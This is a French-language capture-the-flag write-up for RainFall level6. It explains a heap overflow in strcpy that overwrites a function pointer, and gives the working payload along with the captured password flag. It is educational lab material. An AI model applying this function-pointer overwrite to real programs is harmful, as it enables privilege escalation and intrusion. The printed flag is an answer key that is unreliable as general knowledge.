# RainFall CTF - Level6

## Reconnaissance

### Fichier trouvé
```bash
level6@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
```

**Observations :**
- Exécutable avec SUID bit activé (`s` dans les permissions)
- Appartient à `level7` (propriétaire) et `users` (groupe)
- Peut être exécuté avec les privilèges de `level7`

## Analyse statique avec Ghidra

### Fonction main (vulnérable)
```c
void main(undefined4 param_1, int param_2) {
  char *__dest;
  undefined4 *puVar1;
  
  __dest = (char *)malloc(0x40);           // Allocation de 64 octets sur la heap
  puVar1 = (undefined4 *)malloc(4);        // Allocation de 4 octets (pointeur de fonction)
  *puVar1 = m;                             // Stocke l'adresse de la fonction m()
  strcpy(__dest, *(char **)(param_2 + 4)); // VULNÉRABLE - copie argv[1] sans vérification
  (*(code *)*puVar1)();                    // Appelle la fonction pointée par puVar1
  return;
}
```

### Fonction m (par défaut)
```c
void m(void *param_1, int param_2, char *param_3, int param_4, int param_5) {
  puts("Nope");
  return;
}
```

### Fonction cachée n
```c
void n(void) {
  system("/bin/cat /home/user/level7/.pass");
  return;
}
```

**Code assembleur :**
```asm
n:
08048454 55    PUSH EBP
```

L'adresse de la fonction `n()` est **`0x08048454`**.

## Analyse des vulnérabilités

### Heap Buffer Overflow
- **Fonction dangereuse** : `strcpy(__dest, argv[1])`
- **Problème** : Aucune vérification de la taille de `argv[1]`
- **Buffer alloué** : 64 octets (`malloc(0x40)`)
- **Impact** : Débordement possible sur la heap

### Architecture de la heap
```
[Buffer 64 octets] [Métadonnées heap] [Pointeur de fonction 4 octets]
```

Le pointeur de fonction stocké dans `puVar1` se trouve après le buffer alloué.

## Test de débordement

### Conversion hexadécimal → décimal
- **Taille du buffer** : `0x40` = `64` octets en décimal

### Tests de débordement progressifs
```bash
# Test avec la taille exacte du buffer
./level6 $(python -c "print('A' * 64)")
Nope

# Test avec 4 octets supplémentaires
./level6 $(python -c "print('A' * 68)")
Nope

# Test avec 8 octets supplémentaires
./level6 $(python -c "print('A' * 72)")
Segmentation fault (core dumped)

# Test avec 7 octets supplémentaires
./level6 $(python -c "print('A' * 71)")
Nope
```

### Conclusion des tests
- **72 caractères** provoquent un segfault
- Le pointeur de fonction est écrasé à partir du **72ème octet**
- Distance entre le buffer et le pointeur : **68 octets** (64 + 4 métadonnées heap)

## Test de validation
```bash
# Test avec une chaîne très longue pour confirmer la vulnérabilité
./level6 $(python -c "print('A' * 100)")
Segmentation fault (core dumped)
```

## Construction de l'exploit

### Structure du payload
- **Padding** : 68 octets pour atteindre le pointeur de fonction
- **Nouvelle adresse** : 4 octets contenant l'adresse de `n()`

### Calcul précis
```
Buffer: 64 octets
Métadonnées heap: 4 octets  
Pointeur de fonction: 4 octets
Total pour l'overflow: 68 + 4 = 72 octets
```

### Payload final
```bash
./level6 $(python -c "print('A' * 68 + '\x54\x84\x04\x08')")
```

**Structure :**
- `'A' * 68` : Padding pour atteindre le pointeur de fonction
- `\x54\x84\x04\x08` : Adresse de `n()` en little-endian

## Mécanisme d'exécution

1. `malloc(0x40)` alloue 64 octets pour `__dest`
2. `malloc(4)` alloue 4 octets pour `puVar1` (pointeur de fonction)
3. `*puVar1 = m` stocke l'adresse de `m()` dans le pointeur
4. `strcpy(__dest, argv[1])` copie notre payload :
   - Les 68 premiers octets remplissent le buffer et les métadonnées
   - Les 4 octets suivants écrasent le pointeur de fonction avec `0x08048454`
5. `(*(code *)*puVar1)()` appelle la fonction à l'adresse stockée → `n()` au lieu de `m()`
6. `n()` exécute `system("/bin/cat /home/user/level7/.pass")`

## Exploitation réussie

```bash
level6@RainFall:~$ ./level6 $(python -c "print('A' * 68 + '\x54\x84\x04\x08')")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

## Résultats

### Flag obtenu
```
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

### Accès niveau suivant
- **Utilisateur** : `level7`
- **Prochain challenge** : `/home/user/level7/`

## Notes techniques

- **Type de vulnérabilité** : Heap Buffer Overflow
- **Technique d'exploitation** : Function Pointer Overwrite
- **Architecture** : x86 (32-bit)
- **Concepts introduits** :
  - **Heap exploitation** : Premier niveau utilisant la heap au lieu de la stack
  - **Function pointer overwrite** : Redirection via pointeurs de fonctions
  - **Allocations dynamiques** : Exploitation de `malloc()`
  - **Métadonnées heap** : Compréhension de la structure heap
- **Méthode de découverte** : Tests progressifs pour déterminer l'offset exact
- **Offset calculé** : 68 octets (buffer + métadonnées heap)
- **Difficulité** : Intermédiaire - Introduction à l'exploitation heap

## Évolution par rapport aux niveaux précédents

Ce niveau marque une transition importante :
- **Passage stack → heap** : Première exploitation heap du CTF
- **Pointeurs de fonction** : Nouvelle technique de redirection
- **Allocations dynamiques** : Gestion de `malloc()` vs variables locales
- **Tests empiriques** : Découverte d'offset par expérimentation

Cette progression introduit les concepts fondamentaux de l'exploitation heap, préparant aux challenges plus avancés de corruption de métadonnées heap.